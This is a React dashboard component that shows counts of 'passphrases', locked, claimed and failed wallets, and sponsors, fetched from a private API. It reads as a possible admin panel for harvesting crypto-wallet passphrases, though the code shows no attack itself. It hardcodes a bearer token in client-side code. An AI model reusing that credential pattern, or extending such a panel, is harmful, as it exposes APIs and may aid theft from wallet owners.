import React, { useEffect, useState } from 'react'
import { motion } from "framer-motion";
import { Card, CardContent } from './ui/card';
import { Users, Activity, Coins, Wallet, Timer } from 'lucide-react';

const Overview = () => {
    const [totalWallet, setTotalWallet] = useState(0);
    const [totalSponsor, setTotalSponsor] = useState(0);
    const [lockedWallet, setLockedWallet] = useState(0);
    const [claimedWallet, setClaimedWallet] = useState(0);
    const [failedWallet, setFailedWallet] = useState(0);
    const API = import.meta.env.VITE_API_URL;
    async function getStats() {
        const phraseRes = await fetch(`${API}/passphrases/list`, {
            method: 'POST',
            headers: { 
                'Content-Type': 'application/json',
                'Authorization': 'Bearer hfhryeujhshbxhdsjjskaas',
            },
            body: JSON.stringify({ 
                receiverAddress: '*.'

            }),
        });
        const phraseJson = await phraseRes.json();
        const lockedWallets = phraseJson.filter(p => 
            p.status === 'pending' && p.claimableAt != null
        );
        const claimedWallets = phraseJson.filter(p => 
            p.status === 'claimed'
        );
        const failedWallets = phraseJson.filter(p => 
            p.status === 'failed'
        );
        setLockedWallet(lockedWallets.length)
        setClaimedWallet(claimedWallets.length)
        setFailedWallet(failedWallets.length)
        setTotalWallet(phraseJson.length);

        const sponsorRes = await fetch(`${API}/sponsors/list`, {
            method: 'POST',
            headers: { 
                'Content-Type': 'application/json',
                'Authorization': 'Bearer hfhryeujhshbxhdsjjskaas',
            },
            body: JSON.stringify({ 
                name: 'whoami5677'

            }),
        });
        const sponsorJson = await sponsorRes.json();
        setTotalSponsor(sponsorJson.length)

    }
    
    useEffect(() => {
        try{
            getStats()
        } catch(err) {
            console.log(err)
        }
    }, []);
    return (
        <>
            {/* Top stats (mobile-first stacked) */}
            <div className="grid grid-cols-1 gap-3 sm:grid-cols-2 lg:grid-cols-4">
                {[{ title: "Total Wallets", value: totalWallet, icon: Wallet }, { title: "Locked Wallets", value: lockedWallet, icon: Timer }, { title: "Sponsors", value: totalSponsor, icon: Users }, { title: "Failed", value: failedWallet, icon: Wallet }, { title: "Claimed", value: claimedWallet, icon: Coins }, /*{ title: "24h Tx", value: "1,204", icon: Activity } */].map((s, i) => (
                <motion.div key={s.title} initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.05 * i }}>
                    <Card className="rounded-2xl border-indigo-900/40 bg-white/5 shadow-[0_0_0_1px_rgba(99,102,241,0.15)]">
                    <CardContent className="p-4">
                        <div className="flex items-center justify-between">
                        <div>
                            <p className="text-sm uppercase tracking-wider text-indigo-300 font-medium">{s.title}</p>
                            <p className="mt-1 text-xl font-bold text-white">{s.value}</p>
                        </div>
                        <s.icon className="h-6 w-6 text-indigo-300" />
                        </div>
                    </CardContent>
                    </Card>
                </motion.div>
                ))}
            </div>
        </>
    )
}

export default Overview